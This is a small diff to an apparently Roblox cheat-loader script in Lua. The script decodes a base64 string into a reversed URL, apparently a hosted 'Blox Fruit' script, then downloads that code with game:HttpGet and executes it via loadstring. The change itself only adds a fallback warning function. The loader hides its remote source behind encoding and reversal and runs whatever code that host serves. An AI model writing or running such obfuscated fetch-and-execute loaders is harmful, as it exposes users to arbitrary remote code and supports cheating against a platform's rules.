@@ -1,3 +1,4 @@
+
 local str = "YXVsLnRpdXJGMDIleG9sQi9YTEJSL29pLmJ1aHRpZy55eWtjdUQvb2kuYnVodGlnLnl5a2N1ZHRzb2hnLy86c3B0dGg="
 function decode(strs)
 	local code = tostring(strs)
@@ -17,5 +18,6 @@ local url = decode(str)
 if url ~= nil and type(url) == "string" then
     loadstring(game:HttpGet(tostring(url):reverse(),true))()
 else
-    rconsolewarn("Your exploit missing 'base64decode' function")
+    local pogger = rconsolewarn or warn
+    pogger("Your exploit missing 'base64decode' function")
 end
